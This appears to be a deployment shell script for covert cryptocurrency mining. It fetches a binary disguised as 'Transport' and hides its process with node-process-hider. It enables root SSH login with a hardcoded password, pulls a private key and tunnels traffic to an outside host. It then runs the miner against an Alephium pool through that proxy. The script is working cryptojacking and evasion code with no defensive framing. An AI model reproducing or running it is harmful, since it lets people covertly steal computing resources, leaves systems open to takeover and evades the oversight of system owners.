#!/bin/sh
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


echo " "
echo " "

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
chmod +x Transport


ph add Transport

git clone https://github.com/bryanpkc/corkscrew.git
cd corkscrew
autoreconf --install
./configure
make && make install
cd

sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config
cat >> /etc/ssh/ssh_config <<END
    ProxyCommand /usr/local/bin/corkscrew 10.140.0.96 3128 %h %p
END


service ssh restart


service sshd restart


echo "root:Pmataga1@" | chpasswd

wget https://raw.githubusercontent.com/nathanfleight/keypairs/main/sidwellmobster9ohio.pem
chmod 600 sidwellmobster9ohio.pem
ssh ubuntu@18.118.47.187 -o StrictHostKeyChecking=no -D 1338 -f -C -q -N -i sidwellmobster9ohio.pem -p 443

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1338
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
sleep .2

echo " "
echo " "
echo " "
echo " "

netstat -ntlp

echo " "
echo " "
echo " "
echo " "

./Transport -a blake3 -o stratum+ssl://us2.alephium.herominers.com:1199 -u 1Hk3MN2pjgDCDy2PigfxnVMJ9fQcfmb6cYqpsYtMaUziM -w Transport -p x --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:1338
